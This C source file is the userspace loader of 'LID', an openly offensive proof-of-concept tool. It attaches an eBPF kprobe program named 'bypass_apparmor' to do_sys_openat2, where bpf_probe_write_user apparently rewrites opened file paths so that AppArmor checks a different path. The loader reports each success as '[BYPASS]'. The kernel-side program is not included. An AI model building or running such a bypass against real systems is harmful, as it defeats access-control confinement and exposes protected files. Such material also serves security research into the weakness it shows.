// LID — Linux Integrity Drift
// Loader: attaches BPF kprobe, monitors pathname rewrite events

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

#define MAX_PATH_LEN 256

struct event {
    __u32 pid;
    __u32 tgid;
    char comm[16];
    char original_path[MAX_PATH_LEN];
    char rewritten_path[MAX_PATH_LEN];
    __u8 rewritten;
};

static volatile int running = 1;

static void sig_handler(int sig)
{
    running = 0;
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    struct event *e = data;

    if (e->rewritten) {
        printf("\033[1;32m[BYPASS]\033[0m pid=%d tgid=%d comm=%s\n", e->pid, e->tgid, e->comm);
        printf("         original: %s\n", e->original_path);
        printf("         rewritten: %s\n", e->rewritten_path);
        printf("         AppArmor will check '%s' instead of '%s'\n", e->rewritten_path, e->original_path);
    } else {
        printf("\033[1;31m[FAILED]\033[0m pid=%d tgid=%d comm=%s\n", e->pid, e->tgid, e->comm);
        printf("         path: %s (bpf_probe_write_user failed)\n", e->original_path);
    }

    return 0;
}

int main(int argc, char **argv)
{
    struct bpf_object *obj;
    struct bpf_program *prog;
    struct bpf_link *link;
    struct ring_buffer *rb;
    int map_fd;

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    printf("\n");
    printf("  ██╗     ██╗██████╗ \n");
    printf("  ██║     ██║██╔══██╗\n");
    printf("  ██║     ██║██║  ██║\n");
    printf("  ██║     ██║██║  ██║\n");
    printf("  ███████╗██║██████╔╝\n");
    printf("  ╚══════╝╚═╝╚═════╝ \n");
    printf("  Linux Integrity Drift\n\n");

    obj = bpf_object__open_file("lid.bpf.o", NULL);
    if (libbpf_get_error(obj)) {
        fprintf(stderr, "Failed to open BPF object\n");
        return 1;
    }

    if (bpf_object__load(obj)) {
        fprintf(stderr, "Failed to load BPF object\n");
        bpf_object__close(obj);
        return 1;
    }

    prog = bpf_object__find_program_by_name(obj, "bypass_apparmor");
    if (!prog) {
        fprintf(stderr, "Failed to find BPF program\n");
        bpf_object__close(obj);
        return 1;
    }

    link = bpf_program__attach(prog);
    if (libbpf_get_error(link)) {
        fprintf(stderr, "Failed to attach BPF program\n");
        bpf_object__close(obj);
        return 1;
    }

    printf("[*] BPF kprobe attached to do_sys_openat2\n");
    printf("[*] Monitoring for AppArmor bypass events...\n");
    printf("[*] Target: /tmp/secret_test_file.txt -> /tmp/.aa_bypass_link\n");
    printf("[*] Press Ctrl+C to stop\n\n");

    map_fd = bpf_object__find_map_fd_by_name(obj, "events");
    if (map_fd < 0) {
        fprintf(stderr, "Failed to find ring buffer map\n");
        bpf_link__destroy(link);
        bpf_object__close(obj);
        return 1;
    }

    rb = ring_buffer__new(map_fd, handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "Failed to create ring buffer\n");
        bpf_link__destroy(link);
        bpf_object__close(obj);
        return 1;
    }

    while (running) {
        int err = ring_buffer__poll(rb, 100);
        if (err == -EINTR)
            break;
        if (err < 0) {
            fprintf(stderr, "Ring buffer poll error: %d\n", err);
            break;
        }
    }

    printf("\n[*] Cleaning up...\n");
    ring_buffer__free(rb);
    bpf_link__destroy(link);
    bpf_object__close(obj);
    return 0;
}
